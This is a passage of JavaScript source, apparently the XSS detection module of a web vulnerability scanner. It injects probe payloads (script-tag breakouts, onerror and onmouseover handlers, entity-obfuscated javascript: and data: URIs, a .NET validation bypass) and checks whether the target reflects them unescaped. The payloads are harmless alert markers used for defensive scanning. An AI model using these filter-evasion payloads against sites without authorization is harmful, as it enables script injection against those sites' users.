		var inputValue = this.origValue + "-->" + script_start_tag  + script_payload + "(" + rndStr + ")" + script_end_tag + "<!--";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);
			    return false;
		    }
		return true;
	}
    // **************************************************************************************
    function lookForCommentPatternInResponseBody(body, regex)
    {
        var tokens = htmlTokens(body);
        while (token = tokens.nextToken())
        {
            if (token.isComment && token.raw && token.raw.match(regex) !== null)
                return true;
        }
        return false;
    }
    /**************************************************************************************************************/
    classXSS.prototype.testInsideCommentInjectionEndWithBackTick = function()
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        var inputValue = "`<img/src=x onerror=alert(" + rndStr + ")//";
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var regex = /^\s*`<img\/src=x\sonerror=alert\(\d+\)\/\/.*/;
        if (lookForCommentPatternInResponseBody(this.lastJob.response.body, regex))
        {
            this.alert(inputValue);
            return false;
        }
        return true;
    }
    /**************************************************************************************************************/
    classXSS.prototype.testInsideCommentInjectionIECondCommments = function()
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        var inputValue = "[if]><script>alert(" + rndStr + ")</script";
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var regex = /^\[if\]><script>alert\(\d+\)<\/script.*/;
        if (lookForCommentPatternInResponseBody(this.lastJob.response.body, regex))
        {
            this.alert(inputValue);
            return false;
        }
        return true;
    }
    /**************************************************************************************************************/
	classXSS.prototype.testInsideScriptInjection = function()
	{
		if (debug) traceObject(this.found);
		
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr1 = 9000 + random(999);
		var rndStr2 = 9000 + random(999);
		var inputValue = this.origValue + this.origValueSep + rndStr1 + "():;" + rndStr2;
        
		if(this.found.insideScriptSingleQuote){
			inputValue = this.origValue + this.origValueSep + rndStr1 + "'():;" + rndStr2;
		}
		else
		if(this.found.insideScriptDoubleQuote){
			inputValue = this.origValue + this.origValueSep + rndStr1 + '"():;' + rndStr2;
		}
        else 
		if(this.found.insideCommentInline){
			inputValue = this.origValue + this.origValueSep + rndStr1 + '\n():;' + rndStr2;
		}
        else 
		if(this.found.insideCommentMultiline){
			inputValue = this.origValue + this.origValueSep + rndStr1 + '*/():;' + rndStr2;
		}
        
        if (debug) trace(inputValue);
        					
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var tempInputValue = inputValue;
            
		var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);
        for (var i=0; i<founds.length; i++) {
            if (CompareObjects(this.found, founds[i]))    
            {		
    			this.alert(inputValue);				
    			return false;
            }
		}		
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testinsideJavascriptEventHandlerControl = function()
    {
        if (debug) traceObject(this.found);
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr1 = 9000 + random(999);
        var rndStr2 = 9000 + random(999);
        var inputValue = this.origValue + this.origValueSep + rndStr1 + "javascript:console.log(" + rndStr2 + ")";
        if (debug) trace(inputValue);
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var tempInputValue = inputValue;
        var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);
        for (var i=0; i<founds.length; i++) {
            if (CompareObjects(this.found, founds[i]))
            {
                this.alert(inputValue);
                return false;
            }
        }
        return true;
    }
    /**************************************************************************************************************/
    classXSS.prototype.testInsideScriptInjectionDoubleEncoded = function()
    {
        if (debug) traceObject(this.found);
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr1 = 9000 + random(999);
        var rndStr2 = 9000 + random(999);
        var inputValue = this.origValue + this.origValueSep + rndStr1 + "'\"():;" + rndStr2;
        if(this.found.insideScriptSingleQuote){
            inputValue = this.origValue + this.origValueSep + rndStr1 + "'():;" + rndStr2;
        }
        else
        if(this.found.insideScriptDoubleQuote){
            inputValue = this.origValue + this.origValueSep + rndStr1 + '"():;' + rndStr2;
        }
        else
        if(this.found.insideCommentInline){
            inputValue = this.origValue + this.origValueSep + rndStr1 + '\n():;' + rndStr2;
        }
        else
        if(this.found.insideCommentMultiline){
            inputValue = this.origValue + this.origValueSep + rndStr1 + '*/():;' + rndStr2;
        }
        var encodedInputValue = plain2urlAll(inputValue);
        //trace(inputValue);
        if (!this.request(encodedInputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var tempInputValue = inputValue;
        var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);
        for (var i=0; i<founds.length; i++) {
            if (CompareObjects(this.found, founds[i]))
            {
                this.alert(encodedInputValue);
                return false;
            }
        }
        return true;
    }
    /**************************************************************************************************************/
	classXSS.prototype.testInsideScriptInjectionByClosingScriptTag = function()
	{
        if (!this.scheme) return true;
        
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        
        // one cookie xss from some client worked only if the payload is put between double quotes.
        var separator = "";        
        if (this.scheme.getInputTypeStr(this.inputIndex) == 'Cookie') separator = '"';
        
		var inputValue = this.origValue + this.origValueSep + separator + "</script><script>" + script_payload + "(" + rndStr + ")</script>" + separator;
        //trace(inputValue);
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		// check content-type header (only handle html data)
    	var ct = this.lastJob.response.headerValue('content-type').toLowerCase();
    	if (ct != '' && ct.indexOf('html') == -1) return true;		
		
		//trace(this.lastJob.response.body);
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")')) {
			this.alert(inputValue);	
			return false;
		}		
		return true;
	}	    
	/**************************************************************************************************************/
	classXSS.prototype.testinsideJavascriptInjectionHTMLEnt = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr1 = 9000 + random(999);
		var rndStr2 = 9000 + random(999);
		var inputValue = this.origValue + this.origValueSep + rndStr1 + "&apos;&quot;():;" + rndStr2;
		
		if(this.found.insideScriptSingleQuote){
			inputValue = this.origValue + this.origValueSep + rndStr1 + "&apos;():;" + rndStr2;
		}
		else
		if(this.found.insideScriptDoubleQuote){
			inputValue = this.origValue + this.origValueSep + rndStr1 + '&quot;():;' + rndStr2;
		}
					
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var tempInputValue = inputValue;
            
		var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);		
        for (var i=0; i<founds.length; i++) {
            if (CompareObjects(this.found, founds[i]))    
            {		
    			this.alert(inputValue);				
    			return false;
            }
		}
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testinsideJavascriptInjectionImproperHTMLEncoding = function(found)
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr1 = 9000 + random(999);
        var rndStr2 = 9000 + random(999);
        var inputValue = this.origValue + this.origValueSep + rndStr1 + "'\"" + rndStr2;
        if(this.found.insideScriptSingleQuote){
            inputValue = this.origValue + this.origValueSep + rndStr1 + "'" + rndStr2;
        }
        else
        if(this.found.insideScriptDoubleQuote){
            inputValue = this.origValue + this.origValueSep + rndStr1 + '"' + rndStr2;
        }
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        // we need to check various possible encoding variants
        var encodingsSingleQuote = ["&#39;", "&#039;", "&apos;"];
        var encodingsDoubleQuote = ["&#34;", "&#034;", "&quot;"];
        // in URLs, URL decoding is performed
        if (['HREF', 'SRC', 'ACTION'].indexOf(found.parName) != -1)
        {
            encodingsSingleQuote.push("%27");
            encodingsDoubleQuote.push("%22")
        }
        var searchArray = [];
        if(this.found.insideScriptSingleQuote){
            for (var i=0; i<encodingsSingleQuote.length; i++) {
                searchArray.push(inputValue.replace("'", encodingsSingleQuote[i]));
            }
        }
        else
        if(this.found.insideScriptDoubleQuote){
            for (var i=0; i<encodingsDoubleQuote.length; i++) {
                searchArray.push(inputValue.replace('"', encodingsDoubleQuote[i]));
            }
        }
        else {
            searchArray.push(inputValue.replace('"', '&quot;').replace("'", '&#39;'));
            searchArray.push(inputValue.replace('"', '&quot;').replace("'", '&0#39;'));
            searchArray.push(inputValue.replace('"', '&quot;').replace("'", '&apos;'));
            // in URLs, URL decoding is performed
            if (['HREF', 'SRC', 'ACTION'].indexOf(found.parName) != -1)
                searchArray.push(inputValue.replace('"', '%22').replace("'", '%27'));
        }
        // search all possible variants
        for (var j=0; j<searchArray.length; j++) {
            var tempInputValue = searchArray[j];
            if (debug) trace("encoding variant: " + tempInputValue);
            var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);
            for (var i=0; i<founds.length; i++) {
                if (CompareObjects(this.found, founds[i]))
                {
                    this.alert(inputValue);
                    return false;
                }
            }
        }
        return true;
    }
    /**************************************************************************************************************/
	classXSS.prototype.testinsideJavascriptInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr1 = 9000 + random(999);
		var rndStr2 = 9000 + random(999);
		var inputValue = this.origValue + this.origValueSep + rndStr1 + "\"'():;" + rndStr2;
		
		if(this.found.insideScriptSingleQuote){
			inputValue = this.origValue + this.origValueSep + rndStr1 + "'():;" + rndStr2;
		}
		else
		if(this.found.insideScriptDoubleQuote){
			inputValue = this.origValue + this.origValueSep + rndStr1 + '"():;' + rndStr2;
		}
					
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var tempInputValue = inputValue;
            
		var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);		
        for (var i=0; i<founds.length; i++) {
            if (CompareObjects(this.found, founds[i]))
            {		
    			this.alert(inputValue);				
    			return false;
            }
		}
		
		return true;
	}
    /**************************************************************************************************************/
    /* Same Origin Method Execution (SOME) */
    classXSS.prototype.testSOME = function()
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr1 = randStr(4);
        var rndStr2 = randStr(4);
        var inputValue = rndStr1 + "." + rndStr2;
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var tempInputValue = inputValue;
        var founds = SearchInputInResponse(tempInputValue, this.lastJob.response.body);
        for (var i=0; i<founds.length; i++) {
            if (CompareObjects(this.found, founds[i]))
            {
                this.alertSOME(inputValue);
                return false;
            }
        }
        return true;
    }
	/**************************************************************************************************************/
	classXSS.prototype.testInsideTagInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + " src=" + rndStr;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|src=" + rndStr)) {			
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}
	/**************************************************************************************************************/
	classXSS.prototype.testInsideTagNoQuotes = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + " onmouseover=" + script_payload + "(" + rndStr + ") y=";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=*|onmouseover=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}
    
	/**************************************************************************************************************/
	classXSS.prototype.testXSSInsideException = function(useOrigValue)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);
		var inputValue = "";
		
		if (useOrigValue) inputValue = this.origValue + "'\"()&%<acx>" + script_start_tag + script_payload + "(" + rndStr + ")" + script_end_tag;
		else inputValue = "'\"()&%<acx>" + script_start_tag + script_payload + "(" + rndStr + ")" + script_end_tag;
			
		//trace(inputValue);
		if (!this.request(inputValue)) {
			//trace('request failed');
			return false;
		}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		// check content-type header (only handle html data)
    	var ct = this.lastJob.response.headerValue('content-type').toLowerCase();
		
        // detect content type
    	if (ct == '' || ct.indexOf('html') != -1)         
            this.documentType = documentType_html; 
        else                 
        if (ct.indexOf('xml') != -1)             
            this.documentType = documentType_xml;             
        else this.documentType = documentType_invalid; 
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }		
		return true;
	}
    
	/**************************************************************************************************************/
	classXSS.prototype.testinsideMetaRefreshInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = "javascript:" + script_payload + "(" + rndStr + ");";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=meta|content<javascript:" + script_payload + "(" + rndStr + ");")) {
			this.alert(inputValue);	
			return false;
		}		
		return true;
	}   
    
	/**************************************************************************************************************/
	classXSS.prototype.testinsideFormActionInjection = function(postFix)
	{
        if (!postFix) postFix = "";
        
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = "&#02java&#115cript:" + script_payload + "(" + rndStr + ");//http://" + postFix;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=a|href^&#02java&#115cript:" + script_payload + "(" + rndStr + ");")) {
			this.alert(inputValue);	
			return false;
		} 
        
        else
            
		if (hq.executeHtmlQuery("tag=form|action^&#02java&#115cript:" + script_payload + "(" + rndStr + ");")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=frame|src^&#02java&#115cript:" + script_payload + "(" + rndStr + ");")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=iframe|src^&#02java&#115cript:" + script_payload + "(" + rndStr + ");")) {
			this.alert(inputValue);	
			return false;
		}
        
		return true;
	} 
    
	/**************************************************************************************************************/
	classXSS.prototype.testinsideFormActionInjectionHTMLEntities = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = "javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=a|href^javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		} 
        
        else
            
		if (hq.executeHtmlQuery("tag=form|action^javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=frame|src^javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=iframe|src^javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
		return true;
	} 
    
	/**************************************************************************************************************/
	classXSS.prototype.testinsideFormActionInjectionHTMLEntities2 = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = "javascript&#58;" + script_payload + "&lpar;" + rndStr + "&rpar;;";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=a|href^javascript&#58;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		} 
        
        else
            
		if (hq.executeHtmlQuery("tag=form|action^javascript&#58;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=frame|src^javascript&#58;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=iframe|src^javascript&#58;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
		return true;
	}
    
	/**************************************************************************************************************/
	classXSS.prototype.testinsideFormActionInjectionSnuck1 = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = "feed:javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=a|href^feed:javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		} 
        
        else
            
		if (hq.executeHtmlQuery("tag=form|action^feed:javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=frame|src^feed:javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
        else
            
		if (hq.executeHtmlQuery("tag=iframe|src^feed:javascript&colon;" + script_payload + "&lpar;" + rndStr + "&rpar;;")) {
			this.alert(inputValue);	
			return false;
		}
        
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testinsideFormActionInjectionSnuck2 = function()
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        var b64script = plain2b64("<sCrIpt >prompt(" + rndStr + ")< /ScRipT>");
        var inputValue = "data:_;;;:;base64_______," + b64script;
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var hq = new THTMLQuery(this.lastJob.response.body);
        if (hq.executeHtmlQuery("tag=a|href^data:_;;;:;base64_______,")) {
            this.alert(inputValue);
            return false;
        }
        else
        if (hq.executeHtmlQuery("tag=form|action^data:_;;;:;base64_______,")) {
            this.alert(inputValue);
            return false;
        }
        else
        if (hq.executeHtmlQuery("tag=frame|src^data:_;;;:;base64_______,")) {
            this.alert(inputValue);
            return false;
        }
        else
        if (hq.executeHtmlQuery("tag=iframe|src^data:_;;;:;base64_______,")) {
            this.alert(inputValue);
            return false;
        }
        return true;
    }
    /**************************************************************************************************************/
	classXSS.prototype.testHTMLinsideXML = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<html xmlns='http://www.w3.org/1999/xhtml'><script>" + script_payload + "(" + rndStr + ")</script></html>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=html|xmlns=http://www.w3.org/1999/xhtml") && hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}	
    
	/**************************************************************************************************************/
	classXSS.prototype.testHTMLinsideXMLwithQuote = function(quote)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + quote + "><html xmlns='http://www.w3.org/1999/xhtml'><script>" + script_payload + "(" + rndStr + ")</script></html><!--";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=html|xmlns=http://www.w3.org/1999/xhtml") && hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}        
    
	/**************************************************************************************************************/
	classXSS.prototype.testHTMLinsideXMLComment = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "--><html xmlns='http://www.w3.org/1999/xhtml'><script>" + script_payload + "(" + rndStr + ")</script></html><!--";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=html|xmlns=http://www.w3.org/1999/xhtml") && hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}    
    
	/**************************************************************************************************************/
	classXSS.prototype.testDotNetValidationBypass = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<%div style=width:expression(" + script_payload + "(" + rndStr + "))>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=%div|style=width:expression(" + script_payload + "(" + rndStr + "))")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}	    
    
	/**************************************************************************************************************/
	classXSS.prototype.testAHref = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
        
        // first, let's see if a href is accepted
        var ahrefAccepted = false;
        var inputValue = "<a HrEF=http://www.vulnweb.com></a>";
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=a|href=http://www.vulnweb.com")) ahrefAccepted = true;
        
        if (!ahrefAccepted) {
        	// try again for webinspect fuckers
        	inputValue = "<a HrEF=jaVaScRiPT:>";
        	if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
			hq = new THTMLQuery(this.lastJob.response.body);
			if (hq.executeHtmlQuery("tag=a|href=javascript:")) ahrefAccepted = true;        	
        }
        
        if (ahrefAccepted) {
            var variants = Array(
            	"<A HrEF=javascript:" + script_payload + "(${random});//http://>",
                "<A HreF= javascript:" + script_payload + "(${random})>",
                "<A HreF= javascript&colon;" + script_payload + "(${random})>",
                "<A HreF= javascript&#x3A;" + script_payload + "(${random})>",
                "<A HreF= j&#x61;v&#x41;sc&#x52;ipt&#x3A;" + script_payload + "(${random})>",
                "<A HreF=data:text/html,%3CsCript%" + script_payload + "(${random})%3C/scRipt%3E>",
                "<a hREF=feed:javascript&colon;" + script_payload + "(${random})>"
            );
            
            for (var i=0; i<variants.length;i++) {
                var rndStr = 9000 + random(999);		
                var b64script = plain2b64("<sCrIpt >" + script_payload + "(" + rndStr + ")< /ScRipT>");
                var inputValue = variants[i].replace("${random}", rndStr);
                inputValue = inputValue.replace("${base64encodescript}", b64script);
                
                if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
                var hq = new THTMLQuery(this.lastJob.response.body);
                if (
                        hq.executeHtmlQuery("tag=a|href^javascript:" + script_payload + "(" + rndStr + ")") ||
						hq.executeHtmlQuery("tag=a|href=feed:javascript&colon;" + script_payload + "(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=javascript&colon;" + script_payload + "(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=javascript&#x3A;" + script_payload + "(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=j&#x61;v&#x41;sc&#x52;ipt&#x3A;" + script_payload + "(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=data:_;;;:;base64_______," + b64script)
                    )                     
                {
                    this.alert(inputValue);				
			        return false;
                }
            }
        }        
		return true;
	}	    
    
	/**************************************************************************************************************/
	classXSS.prototype.testAngularJsInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
        var prefix = randStr(5).toLowerCase();
        var postfix = randStr(5).toLowerCase();
